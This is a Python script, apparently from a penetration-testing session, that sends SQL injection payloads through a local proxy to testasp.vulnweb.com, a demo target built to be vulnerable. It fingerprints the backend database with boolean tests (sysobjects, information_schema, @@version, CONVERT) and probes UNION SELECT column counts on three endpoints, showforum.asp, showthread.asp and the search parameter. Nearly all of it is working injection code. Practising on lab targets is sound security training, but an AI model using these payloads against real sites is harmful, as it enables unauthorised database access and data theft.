#!/usr/bin/env python3
"""Round 3 (계속) — SQLi 백엔드 지문 채취 + UNION 컬럼 수 탐색."""
import subprocess, urllib.parse

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]


def code(url):
    p = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code} %{size_download}"]
                       + PROXY + ["-m", "25", url], capture_output=True, text=True)
    return p.stdout.strip()


def show(label, url):
    print(f"  {label:58s} -> {code(url)}")


print("### D. DBMS 지문 — 어떤 SQL 방언이 통하는가 (true=200, false/오류=500)")
f = f"{BASE}/showforum.asp?id="
show("baseline                      id=1", f + "1")
for label, pay in [
    ("MSSQL sysobjects>0",      "1 AND (SELECT COUNT(*) FROM sysobjects)>0"),
    ("MySQL information_schema", "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0"),
    ("MSSQL LEN('a')=1",        "1 AND LEN('a')=1"),
    ("MySQL LENGTH('a')=1",     "1 AND LENGTH('a')=1"),
    ("MSSQL @@version exists",  "1 AND @@version IS NOT NULL"),
    ("MSSQL CONVERT(int,@@version)", "1 AND 1=CONVERT(int,@@version)"),
    ("MSSQL SUBSTRING",         "1 AND SUBSTRING('abc',1,1)='a'"),
    ("MySQL SUBSTRING",         "1 AND SUBSTRING('abc',1,1)='a'"),
    ("MSSQL ISNULL",            "1 AND ISNULL(NULL,'x')='x'"),
    ("주석 -- 동작",             "1--"),
    ("주석 /* */ 동작",          "1/*x*/"),
]:
    show(label, f + urllib.parse.quote(pay))

print()
print("### E. UNION 컬럼 수 탐색 (showforum.asp) — 200 이 나오면 그 컬럼 수가 맞음")
for n in range(1, 11):
    cols = ",".join(str(i) for i in range(1, n + 1))
    show(f"UNION SELECT {n} cols", f + urllib.parse.quote(f"0 UNION SELECT {cols}"))

print()
print("### F. UNION 컬럼 수 탐색 (showthread.asp)")
g = f"{BASE}/showthread.asp?id="
show("baseline id=0", g + "0")
for n in range(1, 11):
    cols = ",".join(str(i) for i in range(1, n + 1))
    show(f"UNION SELECT {n} cols", g + urllib.parse.quote(f"-1 UNION SELECT {cols}"))

print()
print("### G. UNION 컬럼 수 탐색 (Search.asp tfSearch)")
h = f"{BASE}/Search.asp?tfSearch="
for n in range(1, 11):
    cols = ",".join(str(i) for i in range(1, n + 1))
    show(f"UNION SELECT {n} cols", h + urllib.parse.quote(f"zzz' UNION SELECT {cols}--"))
